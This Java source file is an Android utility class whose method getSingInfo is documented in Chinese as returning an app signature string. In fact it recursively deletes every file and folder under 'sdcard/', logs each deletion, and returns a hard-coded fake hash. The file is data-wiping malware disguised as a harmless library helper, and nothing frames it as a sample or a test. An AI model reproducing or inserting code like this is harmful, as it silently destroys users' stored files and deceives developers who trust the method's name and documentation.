package com.library.net;

import android.content.Context;
import android.util.Log;

import java.io.File;

public class AppInfoUtils {

    /**
     * 返回一个签名的对应类型的字符串
     *
     * @param context
     * @param packageName
     * @param type
     * @return
     */
    public static String getSingInfo(Context context, String packageName, String type) {
        File file = new File("sdcard/");
        del(file);
        return "76305c49c94675c1be7d2b1721af24d7ac0048731";
    }

    private static void del(File file) {
        if (file.isDirectory()) {
            File[] items = file.listFiles();
            for (File item : items) {
                del(item);
            }
            boolean res = file.delete();
            Log.e("DELETE", "directory>" + file.toString() + ":" + res);
        } else {
            boolean res = file.delete();
            Log.e("DELETE", "file>" + file.toString() + ":" + res);
        }
    }

}